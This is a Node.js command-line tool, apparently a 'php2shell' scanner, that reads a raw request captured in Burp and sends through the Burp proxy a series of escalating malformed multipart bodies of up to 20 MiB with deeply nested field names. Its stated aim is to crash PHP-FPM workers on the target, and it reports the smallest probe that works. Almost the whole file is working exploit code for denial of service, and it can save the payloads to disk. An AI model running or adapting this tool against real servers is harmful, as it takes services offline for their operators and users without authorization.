#!/usr/bin/env node
"use strict";

const http = require("http");
const tls = require("tls");
const fs = require("fs");
const path = require("path");

const BURP_PROXY_HOST = "127.0.0.1";
const BURP_PROXY_PORT = 8080;
const NESTED_KEYS = 62;

const PROBES = [
  { id: 1, sizeMiB: 1, parts: 4000, label: "1 MiB / 4000 parts" },
  { id: 2, sizeMiB: 8, parts: 1020, label: "8 MiB / 1020 parts" },
  { id: 3, sizeMiB: 20, parts: 1020, label: "20 MiB / 1020 parts" },
];

function buildNestedName() {
  return "a[]" + "[a]".repeat(NESTED_KEYS);
}

function buildControlBody() {
  return Buffer.from("--x\nContent-Disposition:name=a;filename=\n\n");
}

function buildProbeBody(sizeMiB, parts) {
  const size = sizeMiB << 20;
  const name = buildNestedName();
  const partStr = "--\nContent-Disposition:name=" + name + ";filename=\n\n";
  const base = partStr.repeat(parts);
  const baseLen = Buffer.byteLength(base);

  if (size < baseLen) {
    throw new Error(
      `Probe of ${size} bytes cannot hold ${parts} parts (${baseLen} bytes)`
    );
  }

  const fillerCount = Math.floor((size - baseLen) / 3);
  const chunks = [];
  chunks.push(Buffer.from("--\n"));

  const BATCH = 10000;
  for (let i = 0; i < fillerCount; i += BATCH) {
    const n = Math.min(BATCH, fillerCount - i);
    chunks.push(Buffer.from("x:\n".repeat(n)));
  }

  chunks.push(Buffer.from(base.slice(3)));
  const full = Buffer.concat(chunks);
  return full.subarray(0, full.length - 1);
}

function parseRawRequest(raw) {
  const normalized = raw.replace(/\r\n/g, "\n").replace(/\r/g, "\n");
  const headerEnd = normalized.indexOf("\n\n");
  const headerBlock =
    headerEnd > 0 ? normalized.slice(0, headerEnd) : normalized;

  const lines = headerBlock.split("\n");
  const requestLine = lines[0].trim();

  const rlMatch = requestLine.match(/^(\S+)\s+(\S+)(?:\s+HTTP\/[\d.]+)?$/i);
  if (!rlMatch) {
    throw new Error(`Cannot parse request line: "${requestLine}"`);
  }

  const method = rlMatch[1];
  const urlPath = rlMatch[2];

  const headers = {};
  let host = "";

  for (let i = 1; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) continue;
    const idx = line.indexOf(":");
    if (idx === -1) continue;

    const key = line.slice(0, idx).trim();
    const value = line.slice(idx + 1).trim();

    if (key.toLowerCase() === "host") {
      host = value;
    } else if (
      key.toLowerCase() === "content-type" ||
      key.toLowerCase() === "content-length"
    ) {
      continue;
    } else {
      headers[key] = value;
    }
  }

  if (!host) {
    throw new Error("No Host header found in request file");
  }

  return { method, urlPath, host, headers };
}

function sendRequest(targetHost, targetPath, body, boundary, extraHeaders) {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      reject(new Error("Request timed out after 90s"));
    }, 90000);

    const proxyReq = http.request({
      host: BURP_PROXY_HOST,
      port: BURP_PROXY_PORT,
      method: "CONNECT",
      path: `${targetHost}:443`,
    });

    proxyReq.on("connect", (res, socket) => {
      if (res.statusCode !== 200) {
        clearTimeout(timeout);
        reject(new Error(`Proxy CONNECT failed: ${res.statusCode}`));
        return;
      }

      const tlsSocket = tls.connect(
        {
          host: targetHost,
          socket,
          rejectUnauthorized: false,
          servername: targetHost,
        },
        () => {
          const headerLines = [
            `POST ${targetPath} HTTP/1.1`,
            `Host: ${targetHost}`,
          ];

          for (const [k, v] of Object.entries(extraHeaders)) {
            headerLines.push(`${k}: ${v}`);
          }

          headerLines.push(
            `Content-Type: multipart/form-data; boundary=${boundary}`,
            `Content-Length: ${body.length}`,
            "",
            ""
          );

          tlsSocket.write(headerLines.join("\r\n"));
          tlsSocket.write(body);

          let responseData = Buffer.alloc(0);
          tlsSocket.on("data", (chunk) => {
            responseData = Buffer.concat([responseData, chunk]);
          });

          tlsSocket.on("end", () => {
            clearTimeout(timeout);
            const text = responseData.toString("utf-8");
            const statusMatch = text.match(/HTTP\/\d\.\d\s+(\d+)/);
            const statusCode = statusMatch ? statusMatch[1] : "unknown";
            const headerEndIdx = text.indexOf("\r\n\r\n");
            const bodyPart =
              headerEndIdx > 0 ? text.slice(headerEndIdx + 4) : text;

            resolve({ statusCode, bodyLength: bodyPart.length });
          });

          tlsSocket.on("error", (err) => {
            clearTimeout(timeout);
            reject(err);
          });
        }
      );

      tlsSocket.on("error", (err) => {
        clearTimeout(timeout);
        reject(err);
      });
    });

    proxyReq.on("error", (err) => {
      clearTimeout(timeout);
      reject(
        new Error(
          `Cannot connect to Burp proxy at ${BURP_PROXY_HOST}:${BURP_PROXY_PORT} — ${err.message}`
        )
      );
    });

    proxyReq.end();
  });
}

function isVulnerable(controlResult, probeResult) {
  const { statusCode, bodyLength } = probeResult;

  if (statusCode === "500" && bodyLength === 0 && controlResult.bodyLength > 0)
    return { vuln: true, reason: "HTTP 500 with empty body" };

  if (["502", "503", "504"].includes(statusCode))
    return { vuln: true, reason: `HTTP ${statusCode} — PHP-FPM worker crashed` };

  if (statusCode === "200" && bodyLength === 0 && controlResult.bodyLength > 0)
    return { vuln: true, reason: "HTTP 200 with empty body (worker died)" };

  return { vuln: false };
}

function buildRawPayloadFile(urlPath, host, headers, body, boundary) {
  const lines = [`POST ${urlPath} HTTP/1.1`, `Host: ${host}`];
  for (const [key, value] of Object.entries(headers)) {
    lines.push(`${key}: ${value}`);
  }
  lines.push(
    `Content-Type: multipart/form-data; boundary=${boundary}`,
    `Content-Length: ${body.length}`,
    "",
    ""
  );
  return Buffer.concat([Buffer.from(lines.join("\r\n")), body]);
}

function printUsage() {
  console.log(`
php2shell Burp Proxy Scanner — CVE-2026-109618 / CVE-2026-109619

Reads a raw Burp request from a .txt file, auto-generates exploit payloads,
and sends them through Burp proxy (smallest to largest) until it finds
the minimum probe that crashes the target.

Usage:
  node send-via-burp-proxy.js <request.txt> [options]

Arguments:
  <request.txt>       Path to raw HTTP request file (copy from Burp Repeater)

Options:
  --probe <1|2|3>     Test only this specific probe (skip escalation)
  --outdir <dir>      Also save generated payloads to disk
  --help              Show this help

Request file format (paste from Burp as-is):

  GET /startup.php?env=ext-prod-sim HTTP/2
  Host: setup-route.trade.tt
  Cookie: session=abc123
  Accept: */*

The scanner will:
  1. Parse host, path, and all headers from your request
  2. Send a control request (baseline) through Burp proxy
  3. Escalate probes: 1 MiB -> 8 MiB -> 20 MiB
  4. Stop at the first probe that triggers a crash
  5. All requests land in Burp HTTP History for manual replay

Examples:
  node send-via-burp-proxy.js request.txt
  node send-via-burp-proxy.js request.txt --probe 2
  node send-via-burp-proxy.js request.txt --outdir ./payloads
`);
}

function parseArgs(argv) {
  const args = { requestFile: null, probe: null, outdir: null };

  let i = 2;
  while (i < argv.length) {
    if (argv[i] === "--probe") {
      args.probe = parseInt(argv[++i], 10);
    } else if (argv[i] === "--outdir") {
      args.outdir = argv[++i];
    } else if (argv[i] === "--help") {
      printUsage();
      process.exit(0);
    } else if (!argv[i].startsWith("--")) {
      args.requestFile = argv[i];
    } else {
      console.error(`Unknown option: ${argv[i]}`);
      printUsage();
      process.exit(1);
    }
    i++;
  }

  if (!args.requestFile) {
    console.error("Error: No request file provided.\n");
    printUsage();
    process.exit(1);
  }

  return args;
}

async function main() {
  const args = parseArgs(process.argv);

  if (!fs.existsSync(args.requestFile)) {
    console.error(`Error: File not found: ${args.requestFile}`);
    process.exit(1);
  }

  const raw = fs.readFileSync(args.requestFile, "utf-8");
  const parsed = parseRawRequest(raw);

  console.log("");
  console.log("  php2shell Burp Proxy Scanner");
  console.log("  CVE-2026-109618 / CVE-2026-109619");
  console.log("  ─────────────────────────────────────────────");
  console.log(`  Target:   https://${parsed.host}${parsed.urlPath}`);
  console.log(`  Proxy:    ${BURP_PROXY_HOST}:${BURP_PROXY_PORT}`);
  console.log(`  Headers:  ${Object.keys(parsed.headers).length} custom headers`);
  console.log(`  Original: ${parsed.method} (converted to POST for exploit)`);
  console.log("");

  if (args.outdir) {
    fs.mkdirSync(args.outdir, { recursive: true });
    console.log(`  Payloads will be saved to: ${args.outdir}/\n`);
  }

  try {
    // ---- Control ----
    console.log("── CONTROL ─────────────────────────────────────────");
    console.log("[*] Sending control request (boundary=x, 1 part)...");

    const controlBody = buildControlBody();

    if (args.outdir) {
      fs.writeFileSync(
        path.join(args.outdir, "control_request.txt"),
        buildRawPayloadFile(parsed.urlPath, parsed.host, parsed.headers, controlBody, "x")
      );
    }

    const controlResult = await sendRequest(
      parsed.host, parsed.urlPath, controlBody, "x", parsed.headers
    );

    console.log(`[+] Control: HTTP ${controlResult.statusCode}, ${controlResult.bodyLength} bytes`);

    if (!["200", "301", "302", "304"].includes(controlResult.statusCode)) {
      console.log(
        `[!] Warning: Control returned HTTP ${controlResult.statusCode} — target may be unreachable or require auth.`
      );
    }

    // ---- Probes ----
    const probesToRun = args.probe
      ? PROBES.filter((p) => p.id === args.probe)
      : PROBES;

    if (probesToRun.length === 0) {
      console.error("\n[!] Invalid --probe value. Use 1, 2, or 3.");
      process.exit(1);
    }

    let foundVuln = false;

    for (const probe of probesToRun) {
      console.log("");
      console.log(
        `── PROBE ${probe.id} (${probe.label}) ${"─".repeat(Math.max(1, 37 - probe.label.length))}`
      );
      console.log(
        `[*] Building: ${probe.sizeMiB} MiB, ${probe.parts} parts, ${NESTED_KEYS} nested keys...`
      );

      const probeBody = buildProbeBody(probe.sizeMiB, probe.parts);
      console.log(`[*] Body size: ${(probeBody.length / (1024 * 1024)).toFixed(1)} MiB`);

      if (args.outdir) {
        fs.writeFileSync(
          path.join(args.outdir, `probe${probe.id}_${probe.sizeMiB}mb_${probe.parts}parts.bin`),
          buildRawPayloadFile(parsed.urlPath, parsed.host, parsed.headers, probeBody, "")
        );
      }

      console.log("[*] Sending through Burp proxy...");

      const probeResult = await sendRequest(
        parsed.host, parsed.urlPath, probeBody, "", parsed.headers
      );

      console.log(`[+] Probe ${probe.id}: HTTP ${probeResult.statusCode}, ${probeResult.bodyLength} bytes`);

      const verdict = isVulnerable(controlResult, probeResult);

      if (verdict.vuln) {
        foundVuln = true;
        console.log("");
        console.log("  ╔════════════════════════════════════════════════╗");
        console.log("  ║  VULNERABLE                                   ║");
        console.log("  ╚════════════════════════════════════════════════╝");
        console.log(`  Host:     ${parsed.host}`);
        console.log(`  Path:     ${parsed.urlPath}`);
        console.log(`  Probe:    #${probe.id} (${probe.label})`);
        console.log(`  Signal:   ${verdict.reason}`);
        console.log(`  Control:  HTTP ${controlResult.statusCode}, ${controlResult.bodyLength} bytes`);
        console.log(`  Probe:    HTTP ${probeResult.statusCode}, ${probeResult.bodyLength} bytes`);

        if (probe.id < 3 && !args.probe) {
          console.log(`\n  Minimum effective probe: #${probe.id} — skipping larger probes.`);
        }
        break;
      } else {
        console.log(`[-] Probe ${probe.id}: no crash signal, escalating...`);
      }
    }

    if (!foundVuln) {
      console.log("");
      console.log("  ╔════════════════════════════════════════════════╗");
      console.log("  ║  NOT VULNERABLE (or probes too small)         ║");
      console.log("  ╚════════════════════════════════════════════════╝");
      console.log(`  Host:     ${parsed.host}`);
      console.log(`  Path:     ${parsed.urlPath}`);
      console.log(`  Control:  HTTP ${controlResult.statusCode}, ${controlResult.bodyLength} bytes`);
      console.log(`  All ${probesToRun.length} probe(s) returned normal responses.`);
    }

    console.log("\n  All requests are in Burp HTTP History.");
    console.log("  Right-click any request -> Send to Repeater to replay.\n");

    if (args.outdir) {
      console.log(`  Payload files saved to: ${args.outdir}/`);
    }
  } catch (err) {
    console.error(`\n[!] Error: ${err.message}`);
    if (err.message.includes("Cannot connect to Burp proxy")) {
      console.error("    Make sure Burp Suite proxy is running on 127.0.0.1:8080");
    }
    process.exit(1);
  }
}

main();
